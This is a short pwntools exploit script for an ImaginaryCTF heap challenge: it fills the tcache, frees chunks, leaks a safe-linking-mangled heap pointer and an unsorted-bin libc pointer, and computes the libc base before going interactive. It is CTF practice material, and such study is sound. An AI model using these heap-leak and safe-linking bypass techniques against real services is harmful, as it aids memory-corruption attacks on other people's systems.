#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./vuln")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    host = args.HOST or 'ret2win.chal.imaginaryctf.org'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


def write(idx, size, data):
    io.sendlineafter(b"> ", str(1).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendlineafter(b"content: ", str(data).encode())


def send(idx):
    io.sendlineafter(b"> ", str(2).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())


def read(idx):
    io.sendlineafter(b"> ", str(3).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    return io.recvline()


def reveal(ptr):
    mask = 0xfff << 36
    while mask:
        ptr ^= (ptr & mask) >> 12
        mask >>= 12
    return ptr


sz = 0x90
for i in range(7):
    write(i, sz, "aaaa")

write(7, sz, "prev")
write(8, 0x100, "yuge")

for i in range(7):
    send(i)

send(7)

leak = u64(read(1).strip().ljust(8, b"\x00"))
log.info(f"{leak=:#x}")

print(hex(reveal(leak)))

leak_libc = u64(read(7).strip().ljust(8, b"\x00"))
log.info(f"{leak_libc=:#x}")

libc.address = leak_libc - 0x219ce0
log.info(f"{libc.address=:#x}")


io.interactive()
